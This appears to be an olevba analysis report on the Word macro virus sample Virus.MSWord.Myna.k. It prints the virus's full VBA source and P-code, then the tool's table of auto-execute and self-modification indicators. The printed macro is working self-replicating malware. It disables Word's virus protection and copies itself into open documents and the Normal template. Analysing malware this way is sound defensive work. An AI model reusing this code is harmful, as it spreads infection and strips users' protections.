olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Myna.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Myna.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'105871752364262771042014.51307040127062E+211058717523642627710420110587175236426277104201
Dim rsx, rox, xix, xxi As Integer: Dim xxe, xex, exx, exd, cxi, cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: o = 0: r = 0
'391355219292538547456009.93473796320952E+213913552192925385474560039135521929253854745600
Randomize
'984516129412711414094.06321043794003E+199845161294127114140998451612941271141409
On Error GoTo 93
'18869417956341381052256.44166175716432E+2018869417956341381052251886941795634138105225
Options.VirusProtection = Chr(48)
'31014379881578339971691.79368555823604E+2131014379881578339971693101437988157833997169
Private Sub Document_Close()

'

Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 Options.VirusProtection = False
 answer = "MYNAMEISVIRUS"
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xitem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xitem In NormalTemplate.VBProject.VBComponents
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub

Private Sub Document_New()
'
Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 Options.VirusProtection = False
 answer = "MYNAMEISVIRUS"
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Count <> 1 Then
  Count = Count + 1
 ' Documents.Add
End If
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xitem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xitem In NormalTemplate.VBProject.VBComponents
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub

Private Sub Document_Open()
Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 answer = "MYNAMEISVIRUS"
  Options.VirusProtection = False
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Count <> 1 Then
  Count = Count + 1
 ' Documents.Add
End If
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xitem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xitem In NormalTemplate.VBProject.VBComponents
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub






-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Myna.k
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9503 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0059 "105871752364262771042014.51307040127062E+211058717523642627710420110587175236426277104201"
' Line #2:
' 	Dim 
' 	VarDefn rsx
' 	VarDefn rox
' 	VarDefn xix
' 	VarDefn xxi (As Integer)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn xxe
' 	VarDefn xex
' 	VarDefn exx
' 	VarDefn exd
' 	VarDefn cxi
' 	VarDefn cix
' 	VarDefn xic
' 	VarDefn eox
' 	VarDefn xoe
' 	VarDefn oxe
' 	VarDefn cii
' 	VarDefn rxe
' 	VarDefn rex
' 	VarDefn exr
' 	VarDefn nix
' 	VarDefn ixn
' 	VarDefn nxi
' 	VarDefn lnr
' 	VarDefn nrl
' 	VarDefn rnl (As String)
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St o 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St r 
' Line #3:
' 	QuoteRem 0x0000 0x0059 "391355219292538547456009.93473796320952E+213913552192925385474560039135521929253854745600"
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	QuoteRem 0x0000 0x0050 "984516129412711414094.06321043794003E+199845161294127114140998451612941271141409"
' Line #6:
' 	OnError 93 
' Line #7:
' 	QuoteRem 0x0000 0x0056 "18869417956341381052256.44166175716432E+2018869417956341381052251886941795634138105225"
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	QuoteRem 0x0000 0x0056 "31014379881578339971691.79368555823604E+2131014379881578339971693101437988157833997169"
' Line #10:
' 	FuncDefn (Private Sub Document_Close())
' Line #11:
' Line #12:
' 	QuoteRem 0x0000 0x0000 ""
' Line #13:
' Line #14:
' 	Dim 
' 	VarDefn aready (As Boolean)
' Line #15:
' 	Dim 
' 	VarDefn star (As Long)
' Line #16:
' 	Dim 
' 	VarDefn send (As Long)
' Line #17:
' 	Dim 
' 	VarDefn answer (As String)
' Line #18:
' 	Dim 
' 	VarDefn path
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	St answer 
' Line #21:
' 	LitDI2 0x0001 
' 	St star 
' Line #22:
' 	LitDI2 0x0001 
' 	St send 
' Line #23:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St path$ 
' Line #24:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #26:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #27:
' 	QuoteRem 0x0003 0x0021 " If xitem.Name = "NewMacros" Then"
' Line #28:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #29:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #30:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld star 
' 	Ld send 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #31:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #32:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #33:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #34:
' 	EndWith 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	StartForVariable 
' 	Next 
' Line #38:
' 	StartForVariable 
' 	Next 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #41:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #42:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #43:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld send 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #44:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #45:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #46:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #47:
' 	EndWith 
' Line #48:
' 	EndIfBlock 
' Line #49:
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	EndSub 
' Line #53:
' Line #54:
' 	FuncDefn (Private Sub Document_New())
' Line #55:
' 	QuoteRem 0x0000 0x0000 ""
' Line #56:
' 	Dim 
' 	VarDefn aready (As Boolean)
' Line #57:
' 	Dim 
' 	VarDefn star (As Long)
' Line #58:
' 	Dim 
' 	VarDefn send (As Long)
' Line #59:
' 	Dim 
' 	VarDefn answer (As String)
' Line #60:
' 	Dim 
' 	VarDefn path
' Line #61:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #62:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	St answer 
' Line #63:
' 	LitDI2 0x0001 
' 	St star 
' Line #64:
' 	LitDI2 0x0001 
' 	St send 
' Line #65:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St path$ 
' Line #66:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #67:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #68:
' 	QuoteRem 0x0001 0x000E " Documents.Add"
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #72:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #73:
' 	QuoteRem 0x0003 0x0021 " If xitem.Name = "NewMacros" Then"
' Line #74:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #75:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #76:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld star 
' 	Ld send 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #77:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #78:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #79:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #80:
' 	EndWith 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	StartForVariable 
' 	Next 
' Line #84:
' 	StartForVariable 
' 	Next 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #87:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #88:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #89:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld send 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #90:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #91:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #92:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #93:
' 	EndWith 
' Line #94:
' 	EndIfBlock 
' Line #95:
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	StartForVariable 
' 	Next 
' Line #98:
' 	EndSub 
' Line #99:
' Line #100:
' 	FuncDefn (Private Sub Document_Open())
' Line #101:
' 	Dim 
' 	VarDefn aready (As Boolean)
' Line #102:
' 	Dim 
' 	VarDefn star (As Long)
' Line #103:
' 	Dim 
' 	VarDefn send (As Long)
' Line #104:
' 	Dim 
' 	VarDefn answer (As String)
' Line #105:
' 	Dim 
' 	VarDefn path
' Line #106:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	St answer 
' Line #107:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #108:
' 	LitDI2 0x0001 
' 	St star 
' Line #109:
' 	LitDI2 0x0001 
' 	St send 
' Line #110:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St path$ 
' Line #111:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #112:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #113:
' 	QuoteRem 0x0001 0x000E " Documents.Add"
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #116:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #117:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #118:
' 	QuoteRem 0x0003 0x0021 " If xitem.Name = "NewMacros" Then"
' Line #119:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #120:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #121:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld star 
' 	Ld send 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #122:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #123:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #124:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #125:
' 	EndWith 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	StartForVariable 
' 	Next 
' Line #129:
' 	StartForVariable 
' 	Next 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #132:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #133:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #134:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld send 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #135:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #136:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #137:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #138:
' 	EndWith 
' Line #139:
' 	EndIfBlock 
' Line #140:
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	StartForVariable 
' 	Next 
' Line #143:
' 	EndSub 
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

